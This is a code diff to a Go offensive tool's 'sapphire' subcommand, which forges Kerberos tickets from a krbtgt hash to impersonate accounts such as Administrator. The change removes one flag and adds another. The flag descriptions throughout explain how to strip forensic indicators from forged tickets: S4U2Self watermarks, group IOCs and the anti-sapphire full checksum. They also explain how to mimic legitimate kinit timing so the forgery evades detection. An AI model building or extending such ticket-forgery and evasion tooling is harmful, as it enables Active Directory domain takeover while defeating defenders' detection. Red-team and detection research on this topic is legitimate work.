@@ -463,7 +463,7 @@ func cmdSapphire(args []string) error {
 	fs := flag.NewFlagSet("sapphire", flag.ExitOnError)
 	var domainSID, impersonate, krbtgtHash, krbtgtAES, outfile string
 	var userID uint
-	var stripWatermark, stripLogonFlags, stripPACAttributes, stripFullChecksum, stripTicketChecksum, syncClientInfoTime, stripProxiable, stripExtraGroups, clearExtraSids bool
+	var stripLogonFlags, stripPACAttributes, stripFullChecksum, stripTicketChecksum, syncClientInfoTime, stripProxiable, stripExtraGroups, clearExtraSids, kinitRenewTill bool
 
 	fs.StringVar(&domainSID, "domain-sid", "", "Domain SID (S-1-5-21-...)")
 	fs.StringVar(&impersonate, "impersonate", "", "User to impersonate (e.g., Administrator)")
@@ -472,7 +472,6 @@ func cmdSapphire(args []string) error {
 	fs.UintVar(&userID, "user-id", 0, "User ID for PAC_REQUESTOR (KB5008380)")
 	fs.StringVar(&outfile, "o", "", "Output file (.kirbi or .ccache)")
 	fs.StringVar(&outfile, "out", "", "Output file (.kirbi or .ccache)")
-	fs.BoolVar(&stripWatermark, "strip-watermark", false, "Substitute S-1-18-2 → S-1-5-11 (Authenticated Users) in ExtraSids — eliminates authority-18 watermark while preserving PAC validity")
 	fs.BoolVar(&stripLogonFlags, "strip-logon-flags", false, "Clear LOGON_RESOURCE_GROUPS (0x200) bit in PAC UserFlags (second S4U2Self watermark)")
 	fs.BoolVar(&stripPACAttributes, "strip-pac-attributes", false, "Rewrite PAC_ATTRIBUTES_INFO flags 0x2 (PAC_WAS_GIVEN_IMPLICITLY, S4U2Self) → 0x1 (PAC_WAS_REQUESTED, AS-REQ)")
 	fs.BoolVar(&stripFullChecksum, "strip-full-checksum", false, "Remove PAC_FULL_CHECKSUM buffer (type 19, KB5020805 anti-sapphire measure)")
@@ -481,6 +480,7 @@ func cmdSapphire(args []string) error {
 	fs.BoolVar(&stripProxiable, "strip-proxiable", false, "Clear PROXIABLE bit in EncTicketPart.Flags (matches KDC behavior for protected/privileged accounts)")
 	fs.BoolVar(&stripExtraGroups, "strip-extra-groups", false, "Substitute RID 572 (Denied RODC Password Replication Group) → RID 513 (Domain Users) in LOGON_INFO — removes S4U2Self-transitive group IOC while preserving PAC validity")
 	fs.BoolVar(&clearExtraSids, "clear-extra-sids", false, "Set SidCount=0 and ExtraSids=NULL in LOGON_INFO (proper NDR-level removal — matches legit kinit baseline of empty ExtraSids)")
+	fs.BoolVar(&kinitRenewTill, "kinit-renew-till", false, "Force RenewTill = AuthTime + 7 days (matches MIT kinit default; otherwise inherits attacker's +24h from AS-REP)")
 	fs.Parse(args)
 
 	// Override global outfile if local one specified
@@ -561,7 +561,6 @@ func cmdSapphire(args []string) error {
 		KDC:                 flags.kdc,
 		TGT:                 tgt,
 		SessionKey:          sessionKey,
-		StripWatermark:      stripWatermark,
 		StripLogonFlags:     stripLogonFlags,
 		StripPACAttributes:  stripPACAttributes,
 		StripFullChecksum:   stripFullChecksum,
@@ -570,6 +569,7 @@ func cmdSapphire(args []string) error {
 		StripProxiable:      stripProxiable,
 		StripExtraGroups:    stripExtraGroups,
 		ClearExtraSids:      clearExtraSids,
+		KinitRenewTill:      kinitRenewTill,
 	}
 
 	result, err := forge.ForgeSapphireTicket(context.Background(), req)
